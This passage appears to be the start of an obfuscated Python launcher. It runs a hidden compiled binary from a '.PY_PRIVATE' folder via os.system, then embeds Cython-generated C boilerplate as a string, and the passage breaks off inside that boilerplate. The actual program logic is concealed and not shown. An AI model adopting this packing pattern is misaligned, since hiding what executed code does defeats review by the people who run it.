
import os
import sys

PSH_TEAM_KEY = "بخ 👀"

EXECUTE_FILE = ".PY_PRIVATE/20250509141258962"
PREFIX = sys.prefix
EXPORT_PYTHONHOME = 'export PYTHONHOME='+PREFIX
EXPORT_PYTHON_EXECUTABLE = 'export PYTHON_EXECUTABLE='+sys.executable

RUN = "./"+EXECUTE_FILE

if os.path.isfile(EXECUTE_FILE):
    os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+RUN)
    exit(0)

C_SOURCE = r'''#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_33"
#define CYTHON_HEX_VERSION 0x001D21F0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PY_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
